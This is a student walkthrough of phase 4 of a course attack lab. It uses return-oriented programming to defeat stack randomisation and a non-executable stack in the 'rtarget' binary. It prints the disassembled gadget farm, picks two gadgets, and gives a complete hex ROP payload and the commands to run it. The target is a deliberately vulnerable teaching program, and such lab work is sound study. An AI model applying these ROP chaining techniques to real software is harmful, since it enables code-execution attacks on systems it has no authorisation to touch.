# Phase4:

This one is different from the last 3 phases. The last 3 phases were considered code injections while this exploit is a ROP (Return Oriented Programming). The reason we can't use code injections is becase rtarget uses stack randomization which prevents you from injecting code to a fixed address and running your exploit. Additionally, there is a non-executable memory block which prevents the instructions you provide from executing because it is marked as 'non executable'. 

What we need to do, is sift through start_farm to end_farm to find instructions that we can use to deploy our exploit. 
First, we need to do an objdump on the rtarget file:
```
objdump -d rtarget > phase5and6.txt
```
We will then want to identify what is in start_farm to end_farm:
```
00000000004027f9 <start_farm>:
  4027f9:	f3 0f 1e fa          	endbr64 
  4027fd:	b8 01 00 00 00       	mov    $0x1,%eax
  402802:	c3                   	ret    

0000000000402803 <getval_236>:
  402803:	f3 0f 1e fa          	endbr64 
  402807:	b8 ea 48 90 90       	mov    $0x909048ea,%eax
  40280c:	c3                   	ret    

000000000040280d <addval_216>:
  40280d:	f3 0f 1e fa          	endbr64 
  402811:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  402817:	c3                   	ret    

0000000000402818 <addval_495>:
  402818:	f3 0f 1e fa          	endbr64 
  40281c:	8d 87 48 89 c7 94    	lea    -0x6b3876b8(%rdi),%eax
  402822:	c3                   	ret    

0000000000402823 <setval_178>:
  402823:	f3 0f 1e fa          	endbr64 
  402827:	c7 07 58 90 90 90    	movl   $0x90909058,(%rdi)
  40282d:	c3                   	ret    

000000000040282e <addval_241>:
  40282e:	f3 0f 1e fa          	endbr64 
  402832:	8d 87 58 89 c7 c3    	lea    -0x3c3876a8(%rdi),%eax
  402838:	c3                   	ret    

0000000000402839 <setval_166>:
  402839:	f3 0f 1e fa          	endbr64 
  40283d:	c7 07 58 90 90 90    	movl   $0x90909058,(%rdi)
  402843:	c3                   	ret    

0000000000402844 <setval_307>:
  402844:	f3 0f 1e fa          	endbr64 
  402848:	c7 07 b7 79 58 92    	movl   $0x925879b7,(%rdi)
  40284e:	c3                   	ret    

000000000040284f <getval_350>:
  40284f:	f3 0f 1e fa          	endbr64 
  402853:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
  402858:	c3                   	ret    

0000000000402859 <mid_farm>:
  402859:	f3 0f 1e fa          	endbr64 
  40285d:	b8 01 00 00 00       	mov    $0x1,%eax
  402862:	c3                   	ret    

0000000000402863 <add_xy>:
  402863:	f3 0f 1e fa          	endbr64 
  402867:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  40286b:	c3                   	ret    

000000000040286c <setval_194>:
  40286c:	f3 0f 1e fa          	endbr64 
  402870:	c7 07 89 c2 94 d2    	movl   $0xd294c289,(%rdi)
  402876:	c3                   	ret    

0000000000402877 <setval_125>:
  402877:	f3 0f 1e fa          	endbr64 
  40287b:	c7 07 71 60 81 ce    	movl   $0xce816071,(%rdi)
  402881:	c3                   	ret    

0000000000402882 <addval_304>:
  402882:	f3 0f 1e fa          	endbr64 
  402886:	8d 87 1d 89 c2 90    	lea    -0x6f3d76e3(%rdi),%eax
  40288c:	c3                   	ret    

000000000040288d <getval_296>:
  40288d:	f3 0f 1e fa          	endbr64 
  402891:	b8 48 89 e0 c3       	mov    $0xc3e08948,%eax
  402896:	c3                   	ret    

0000000000402897 <getval_474>:
  402897:	f3 0f 1e fa          	endbr64 
  40289b:	b8 81 d1 90 90       	mov    $0x9090d181,%eax
  4028a0:	c3                   	ret    

00000000004028a1 <getval_370>:
  4028a1:	f3 0f 1e fa          	endbr64 
  4028a5:	b8 99 89 d1 94       	mov    $0x94d18999,%eax
  4028aa:	c3                   	ret    

00000000004028ab <getval_377>:
  4028ab:	f3 0f 1e fa          	endbr64 
  4028af:	b8 1a c9 ce 90       	mov    $0x90cec91a,%eax
  4028b4:	c3                   	ret    

00000000004028b5 <getval_336>:
  4028b5:	f3 0f 1e fa          	endbr64 
  4028b9:	b8 88 c2 90 90       	mov    $0x9090c288,%eax
  4028be:	c3                   	ret    

00000000004028bf <addval_428>:
  4028bf:	f3 0f 1e fa          	endbr64 
  4028c3:	8d 87 89 ce 94 c9    	lea    -0x366b3177(%rdi),%eax
  4028c9:	c3                   	ret    

00000000004028ca <getval_431>:
  4028ca:	f3 0f 1e fa          	endbr64 
  4028ce:	b8 89 d1 94 c9       	mov    $0xc994d189,%eax
  4028d3:	c3                   	ret    

00000000004028d4 <addval_257>:
  4028d4:	f3 0f 1e fa          	endbr64 
  4028d8:	8d 87 81 ce 20 db    	lea    -0x24df317f(%rdi),%eax
  4028de:	c3                   	ret    

00000000004028df <setval_252>:
  4028df:	f3 0f 1e fa          	endbr64 
  4028e3:	c7 07 89 ce 90 90    	movl   $0x9090ce89,(%rdi)
  4028e9:	c3                   	ret    

00000000004028ea <getval_397>:
  4028ea:	f3 0f 1e fa          	endbr64 
  4028ee:	b8 89 d1 78 db       	mov    $0xdb78d189,%eax
  4028f3:	c3                   	ret    

00000000004028f4 <setval_437>:
  4028f4:	f3 0f 1e fa          	endbr64 
  4028f8:	c7 07 49 89 e0 90    	movl   $0x90e08949,(%rdi)
  4028fe:	c3                   	ret    

00000000004028ff <setval_485>:
  4028ff:	f3 0f 1e fa          	endbr64 
  402903:	c7 07 8d d1 38 c0    	movl   $0xc038d18d,(%rdi)
  402909:	c3                   	ret    

000000000040290a <setval_133>:
  40290a:	f3 0f 1e fa          	endbr64 
  40290e:	c7 07 89 c2 c4 d2    	movl   $0xd2c4c289,(%rdi)
  402914:	c3                   	ret    

0000000000402915 <setval_232>:
  402915:	f3 0f 1e fa          	endbr64 
  402919:	c7 07 08 89 e0 c3    	movl   $0xc3e08908,(%rdi)
  40291f:	c3                   	ret    

0000000000402920 <addval_295>:
  402920:	f3 0f 1e fa          	endbr64 
  402924:	8d 87 4c a9 c2 90    	lea    -0x6f3d56b4(%rdi),%eax
  40292a:	c3                   	ret    

000000000040292b <setval_171>:
  40292b:	f3 0f 1e fa          	endbr64 
  40292f:	c7 07 09 c2 90 c3    	movl   $0xc390c209,(%rdi)
  402935:	c3                   	ret    

0000000000402936 <addval_446>:
  402936:	f3 0f 1e fa          	endbr64 
  40293a:	8d 87 f0 89 c2 90    	lea    -0x6f3d7610(%rdi),%eax
  402940:	c3                   	ret    

0000000000402941 <setval_383>:
  402941:	f3 0f 1e fa          	endbr64 
  402945:	c7 07 89 ce 18 c9    	movl   $0xc918ce89,(%rdi)
  40294b:	c3                   	ret    

000000000040294c <setval_401>:
  40294c:	f3 0f 1e fa          	endbr64 
  402950:	c7 07 89 d1 90 c3    	movl   $0xc390d189,(%rdi)
  402956:	c3                   	ret    

0000000000402957 <addval_450>:
  402957:	f3 0f 1e fa          	endbr64 
  40295b:	8d 87 48 89 e0 c1    	lea    -0x3e1f76b8(%rdi),%eax
  402961:	c3                   	ret    

0000000000402962 <addval_111>:
  402962:	f3 0f 1e fa          	endbr64 
  402966:	8d 87 48 89 e0 c2    	lea    -0x3d1f76b8(%rdi),%eax
  40296c:	c3                   	ret    

000000000040296d <getval_209>:
  40296d:	f3 0f 1e fa          	endbr64 
  402971:	b8 48 8d e0 c3       	mov    $0xc3e08d48,%eax
  402976:	c3                   	ret    

0000000000402977 <setval_340>:
  402977:	f3 0f 1e fa          	endbr64 
  40297b:	c7 07 48 89 e0 94    	movl   $0x94e08948,(%rdi)
  402981:	c3                   	ret    

0000000000402982 <addval_107>:
  402982:	f3 0f 1e fa          	endbr64 
  402986:	8d 87 89 d1 48 db    	lea    -0x24b72e77(%rdi),%eax
  40298c:	c3                   	ret    

000000000040298d <getval_453>:
  40298d:	f3 0f 1e fa          	endbr64 
  402991:	b8 89 d1 84 c0       	mov    $0xc084d189,%eax
  402996:	c3                   	ret    

0000000000402997 <addval_227>:
  402997:	f3 0f 1e fa          	endbr64 
  40299b:	8d 87 89 ce 90 c3    	lea    -0x3c6f3177(%rdi),%eax
  4029a1:	c3                   	ret    

00000000004029a2 <addval_179>:
  4029a2:	f3 0f 1e fa          	endbr64 
  4029a6:	8d 87 af 48 89 e0    	lea    -0x1f76b751(%rdi),%eax
  4029ac:	c3                   	ret    

00000000004029ad <setval_199>:
  4029ad:	f3 0f 1e fa          	endbr64 
  4029b1:	c7 07 05 c9 ce c3    	movl   $0xc3cec905,(%rdi)
  4029b7:	c3                   	ret    

00000000004029b8 <addval_293>:
  4029b8:	f3 0f 1e fa          	endbr64 
  4029bc:	8d 87 09 c2 20 d2    	lea    -0x2ddf3df7(%rdi),%eax
  4029c2:	c3                   	ret    

00000000004029c3 <end_farm>:
  4029c3:	f3 0f 1e fa          	endbr64 
  4029c7:	b8 01 00 00 00       	mov    $0x1,%eax
  4029cc:	c3                   	ret    
```
We are trying to find a way to get our cookie on to the rdi register. to do this, we want to find a gadget that can allow us to do the popq %rax instruction. This will remove the topmost value from the stack and store it in the rax register. Which we can then move on to the rdi register. According to the charts provided, the encoding for the popq %rax instruction is '58'. So, we need to find a set of instructions in the following sequence '58 c3'. We need the c3 so it effectively transfers control to the address that was popped. It helps chain together multiple gadgets (as we will need another gadget).

After searching through the farm, we find the following:
```
0000000000402839 <setval_166>:
  402839:	f3 0f 1e fa          	endbr64 
  40283d:	c7 07 58 90 90 90    	movl   $0x90909058,(%rdi)
  402843:	c3                   	ret 
```
We can ignore the '90's because they are considered no op (no operation). So, we find an instruction with 58 followed by c3.

The operation is shown above at address `40283d` however, the 58 instruction doesn't start until the 3rd byte. This means we need to add 2 bytes to the address to get the exact instruction we need to implement
```
40283d + 2 bytes = 40283f
```
Now to our second instruction. We are looking for movq %rax %rdi. This instruction will move the value in rax to rdi (which is where we need the cookie!). According to the chart provided, the encoding is `48 89 c7`. So we are looking for `48 89 c7 c3`.

And here is what I find in the farm:
```
000000000040284f <getval_350>:
  40284f:	f3 0f 1e fa          	endbr64 
  402853:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
  402858:	c3                   	ret
```
The operation above is shown at the address `402853` however, the 48 instruction doesn't start until the 2nd byte. This means we need to add 1 byte to the address to get the exact instruction we need:
```
402853 + 1 byte = 402854
```
Lastly, we need the cookie which is: `0x76ebdb56`
We also need address to touch2: `0000000000402647`

Now lets combine this into our text file:
```
00 00 00 00 00 00 00 00 /*padding. Buffer = 56bytes*/
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
3f 28 40 00 00 00 00 00 /*1st gadget. popq $rax* address*/
56 db eb 76 00 00 00 00 /*cookie*/
54 28 40 00 00 00 00 00 /*2nd gadget. movq %rax to %rdi address*/
47 26 40 00 00 00 00 00 /*touch2 address*/
```
We start off with the padding to reach the saved return address on the stack. Secondly, we add the 1st gadget to pop the value on the stack on to rax. Then we add the value of the cookie so it gets added to rax. Next we want to move the value that is in rax to rdi with the second gadget. And then we add touch2's address so we call the function with the correct cookie.

Now, lets made the raw exploit file:
```
./hex2raw < **r**target.l2.txt > exploit4.dat
```
```
./rtarget < exploit4.dat
```
done!